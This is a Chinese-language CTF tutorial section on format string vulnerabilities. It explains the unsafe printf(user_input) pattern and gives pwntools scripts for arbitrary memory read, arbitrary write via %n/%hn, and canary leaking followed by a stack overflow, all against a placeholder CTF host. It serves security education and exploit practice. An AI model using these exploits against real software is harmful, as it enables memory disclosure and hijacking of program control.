# 格式化字符串漏洞

### 4.1 漏洞原理

```c
/* 格式化字符串漏洞示例
 * 
 * 漏洞代码:
 * printf(user_input);  // 用户输入直接作为格式化字符串
 * 
 * 正确代码:
 * printf("%s", user_input);
 */

/* 
 * 常见格式化说明符:
 * %d - 输出十进制整数
 * %x - 输出十六进制
 * %s - 输出字符串（从栈上取地址）
 * %p - 输出指针地址
 * %n - 将已输出的字节数写入指定地址（核心利用）
 * %hn - 写入2字节
 * %hhn - 写入1字节
 * %c - 输出字符
 *
 * %N$p - 输出第N个参数
 * %N$x - 第N个参数的十六进制
 * %Nc - 输出N个字符（用于控制%n写入的值）
 */
```

### 4.2 任意地址读

```python
from pwn import *

context(arch='amd64', os='linux')

p = remote('ctf.example.com', 9999)

# 1. 确定格式化字符串的偏移
# 输入 AAAA%p.%p.%p.%p.%p.%p.%p.%p
# 找到 0x41414141 出现的位置
for i in range(1, 20):
    payload = f'AAAA%{i}$p'
    p.sendline(payload.encode())
    result = p.recvline()
    if '41414141' in result.hex() or '0x41414141' in result.decode(errors='ignore'):
        print(f"[+] 偏移: {i}")
        offset = i
        break

# 2. 读取指定地址的数据
# 利用 %s 读取地址处的内容
# 需要将目标地址放在格式化字符串中
target_addr = 0x601018  # 要读取的地址

# 构造payload: 地址 + %offset$s
# 注意64位地址可能包含\x00导致截断
# 解决方法: 将地址放在后面
payload = f'%{offset + 1}$s'.encode()
payload = payload.ljust(8, b'\x00')  # 对齐到8字节
payload += p64(target_addr)

p.sendline(payload)
leaked = p.recv()
print(f"[+] 泄露数据: {leaked}")
```

### 4.3 任意地址写

```python
from pwn import *

context(arch='amd64', os='linux')

p = remote('ctf.example.com', 9999)

# 利用 %n 写入数据
# %n: 将已输出的字符数写入地址
# %hn: 写入2字节
# %hhn: 写入1字节

# 目标: 将 0x401234 写入地址 0x601050
target = 0x601050
value = 0x401234

# 方法: 分字节写入
# 将目标地址拆分为4个字节地址
# 分别写入对应值

# 构造写入payload
def fmt_write(offset, target, value):
    """构造格式化字符串写入payload"""
    
    # 将value拆分为4个2字节
    val_parts = [(value >> (i * 16)) & 0xffff for i in range(2)]
    addr_parts = [target + i * 2 for i in range(2)]
    
    payload = b''
    # 写入地址（放在payload开头，64位需要处理\x00）
    for addr in addr_parts:
        payload += p64(addr)
    
    # 对每个2字节值构造 %c 和 %hn
    written = len(payload)  # 已输出的字节数
    for i, val in enumerate(val_parts):
        if val > written:
            payload += f'%{val - written}c'.encode()
            written = val
        payload += f'%{offset + i}$hn'.encode()
    
    return payload

# 实际CTF中通常使用工具
# 可以使用 pwntools 的 fmtstr_payload
payload = fmtstr_payload(offset, {target: value}, write_size='byte')
p.sendline(payload)
```

### 4.4 泄露canary

```python
from pwn import *

context(arch='amd64', os='linux')

# Canary在栈上的位置:
# [局部变量]
# [canary]       ← 需要泄露
# [saved rbp]
# [return addr]

# 利用格式化字符串泄露canary
p = remote('ctf.example.com', 9999)

# 假设格式化字符串偏移为6
# canary在栈上的偏移为11（需要分析确定）
# 可以通过 %11$p 泄露canary

p.sendline(b'%11$p')
result = p.recvline()
canary = int(result.strip(), 16)
print(f"[+] Canary: {hex(canary)}")

# 使用泄露的canary进行栈溢出
# 注意: canary最低字节为\x00，需要正确填充
offset = 0x40  # 缓冲区到canary的距离
payload = b'A' * offset
payload += p64(canary)    # 正确的canary
payload += b'B' * 8       # saved rbp
payload += p64(backdoor)  # 返回地址

p.sendline(payload)
p.interactive()
```
